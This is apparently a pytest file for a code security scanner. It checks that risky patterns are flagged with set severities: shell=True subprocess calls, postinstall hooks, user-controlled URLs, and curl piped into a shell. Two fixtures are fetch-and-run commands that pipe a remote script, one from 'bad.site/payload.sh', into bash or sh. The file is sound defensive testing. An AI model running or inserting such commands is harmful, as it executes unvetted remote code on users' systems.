from server.analyzers.security import ScannedFile, scan_security


def test_detects_subprocess_shell_true() -> None:
    files = [
        ScannedFile(
            path="scripts/run.py",
            text="import subprocess\nsubprocess.run(user_cmd, shell=True)\n",
        )
    ]
    result = scan_security(files)
    matched = [item for item in result.findings if "shell=True" in item.evidence]
    assert matched
    assert matched[0].severity in {"HIGH", "CRITICAL"}


def test_detects_curl_pipe_bash_as_critical() -> None:
    files = [ScannedFile(path="install.sh", text="curl https://x.y/install.sh | bash\n")]
    result = scan_security(files)
    matched = [item for item in result.findings if item.id.startswith("SEC_SH_PIPE_EXEC_001")]
    assert matched
    assert matched[0].severity == "CRITICAL"


def test_detects_postinstall_script_as_high() -> None:
    files = [
        ScannedFile(
            path="package.json",
            text='{"name":"x","scripts":{"postinstall":"node scripts/setup.js"}}',
        )
    ]
    result = scan_security(files)
    matched = [item for item in result.findings if item.id.startswith("SEC_DEP_POSTINSTALL_001")]
    assert matched
    assert matched[0].severity == "HIGH"


def test_detects_requests_get_user_url_as_medium() -> None:
    files = [
        ScannedFile(
            path="fetch.py",
            text="import requests\nresp = requests.get(user_url)\n",
        )
    ]
    result = scan_security(files)
    matched = [item for item in result.findings if item.id.startswith("SEC_NET_USER_URL_001")]
    assert matched
    assert matched[0].severity == "MEDIUM"


def test_computes_trust_badge_correctly() -> None:
    files = [ScannedFile(path="script.sh", text="curl https://bad.site/payload.sh | sh\n")]
    result = scan_security(files)
    assert result.risk_score >= 100
    assert result.trust_badge == "Not Recommended"
